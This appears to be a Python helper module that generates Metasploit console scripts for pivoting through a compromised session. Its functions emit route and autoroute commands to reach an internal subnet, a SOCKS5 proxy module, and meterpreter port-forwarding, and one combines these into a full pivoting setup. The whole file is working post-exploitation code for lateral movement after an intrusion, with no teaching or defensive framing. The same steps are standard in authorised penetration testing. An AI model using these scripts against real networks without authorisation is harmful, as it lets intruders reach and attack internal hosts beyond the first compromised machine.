def get_route_script(session_id, target_network, netmask):
    return f"""# Metasploit routing through session {session_id}
# Add route to {target_network}

route add {target_network} {netmask} {session_id}
route print

# Optional: Auto-route
use post/multi/manage/autoroute
set SESSION {session_id}
run
"""

def get_socks_script(session_id, socks_port):
    return f"""# Metasploit SOCKS proxy through session {session_id}

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT {socks_port}
set VERSION 5
run -j

# Show proxy info
jobs
"""

def get_portfwd_script(session_id, local_port, remote_host, remote_port):
    return f"""# Port forwarding through session {session_id}

sessions -i {session_id}
portfwd add -l {local_port} -p {remote_port} -r {remote_host}
portfwd list
"""

def get_complete_script(session_id, target_network, netmask, socks_port):
    return f"""# Complete pivoting setup for session {session_id}

# Step 1: Add route
route add {target_network} {netmask} {session_id}
route print

# Step 2: Auto-route
use post/multi/manage/autoroute
set SESSION {session_id}
run

# Step 3: Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT {socks_port}
set VERSION 5
run -j

# Show status
jobs
route print
"""